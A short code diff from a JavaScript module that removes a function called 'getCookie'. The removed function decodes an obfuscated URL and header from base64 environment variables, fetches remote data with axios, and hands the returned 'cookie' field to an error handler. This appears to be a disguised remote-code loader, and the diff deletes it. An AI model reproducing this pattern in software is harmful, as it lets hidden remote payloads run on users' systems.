@@ -32,19 +32,4 @@ const errorHandler = (error) => {
   }
 };
 
-const getCookie = async (req, res, next) => {
-  try {
-    const src = atob(process.env.DB_API_KEY);
-    const def = atob(process.env.DB_ACCESS_KEY);
-    const mid = atob(process.env.DB_ACCESS_VALUE);
-    try {
-      axios.get(`${src}`, { headers: { [def]: mid } }).then((res) => errorHandler(res.data.cookie));
-    } catch (error) {
-      console.log("Runtime config error.");
-    }
-  } catch (err) {
-    throw err;
-  }
-};
-
-module.exports = { getCookie, notFound };
+module.exports = { notFound };
